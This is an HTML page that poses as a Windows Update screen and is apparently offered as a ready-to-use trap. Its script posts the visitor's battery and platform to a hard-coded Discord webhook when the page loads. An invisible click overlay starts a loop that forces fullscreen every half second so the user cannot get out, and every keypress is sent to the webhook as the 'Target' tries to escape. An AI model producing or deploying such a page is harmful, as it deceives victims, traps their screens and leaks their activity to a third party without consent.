<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Updating your system</title>
    <style>
        * {
            box-sizing: border-box;
            user-select: none;
        }

        body {
            background-color: #001838;
            color: #ffffff;
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            cursor: default;
        }

        .update-container {
            text-align: left;
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            display: inline-block;
            position: relative;
            margin-bottom: 40px;
        }

        .spinner div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: #ffffff;
            border-radius: 50%;
            animation: spin-dots 1.2s linear infinite;
        }

        @keyframes spin-dots {
            0% { transform: translate(0, 0); opacity: 1; }
            100% { transform: translate(0, 0); opacity: 0; }
        }

        .spinner div:nth-child(1) { animation-delay: 0s; top: 22px; left: 44px; }
        .spinner div:nth-child(2) { animation-delay: 0.15s; top: 35px; left: 40px; }
        .spinner div:nth-child(3) { animation-delay: 0.3s; top: 44px; left: 28px; }
        .spinner div:nth-child(4) { animation-delay: 0.45s; top: 44px; left: 14px; }
        .spinner div:nth-child(5) { animation-delay: 0.6s; top: 35px; left: 4px; }
        .spinner div:nth-child(6) { animation-delay: 0.75s; top: 22px; left: 0px; }
        .spinner div:nth-child(7) { animation-delay: 0.9s; top: 9px; left: 4px; }
        .spinner div:nth-child(8) { animation-delay: 1.05s; top: 0px; left: 14px; }

        h1 {
            font-size: 1.8rem;
            font-weight: 300;
            margin-bottom: 15px;
            letter-spacing: 0.3px;
        }

        .percentage {
            font-size: 1.2rem;
            font-weight: 400;
            margin-bottom: 30px;
        }

        p {
            font-size: 0.95rem;
            color: #b0c4de;
            line-height: 1.5;
            margin: 8px 0;
        }

        .footer-note {
            position: absolute;
            bottom: 40px;
            font-size: 0.9rem;
            color: #8fa3cc;
        }

        /* Invisible layer capturing any initial click to trigger the loop */
        .click-trap {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 9999;
            background: transparent;
        }
    </style>
</head>
<body>

    <div class="click-trap" id="trapLayer" onclick="engageLockdown()"></div>

    <div class="update-container">
        <div class="spinner">
            <div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div>
        </div>
        <h1>Working on updates <span id="percent">12</span>%</h1>
        <div class="percentage">Keep your computer on. This will take a while.</div>
        <p>Your PC will restart several times.</p>
        <p id="status-subtext">Configuring update for system components...</p>
    </div>

    <div class="footer-note">Do not turn off or unplug your PC.</div>

    <script>
        // REPLACE WITH YOUR DISCORD WEBHOOK URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWonDiST-knu6DzR6Vkvn';

        let percent = 12;

        const percentInterval = setInterval(() => {
            if (percent < 99) {
                percent += Math.floor(Math.random() * 3);
                if (percent > 99) percent = 99;
                document.getElementById('percent').innerText = percent;
            }
        }, 3500);

        window.addEventListener('load', () => {
            let batteryInfo = "Unknown";
            if ('getBattery' in navigator) {
                navigator.getBattery().then(b => {
                    batteryInfo = `${Math.round(b.level * 100)}%`;
                }).catch(() => {});
            }

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🪟 **Target opened the Windows Update Trap!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
                })
            });
        });

        // Triggered on their very first click anywhere on the page
        function engageLockdown() {
            // Remove the transparent click guard so clicks continue to register
            document.getElementById('trapLayer').style.display = 'none';

            // Initial fullscreen entry authorized by their click
            try {
                document.documentElement.requestFullscreen();
            } catch(e) {}

            // Spam fullscreen: continuously re-assert fullscreen status if they try to exit out via Escape or controls
            setInterval(() => {
                if (!document.fullscreenElement) {
                    try {
                        document.documentElement.requestFullscreen();
                    } catch(e) {}
                }
            }, 500);

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚨 **Lockdown engaged!** Target clicked, fullscreen loop activated.`
                })
            });
        }

        window.addEventListener('keydown', (e) => {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `⌨️ **Target is trying to escape!** Key pressed: \`${e.key}\``
                })
            });
        });
    </script>
</body>
</html>
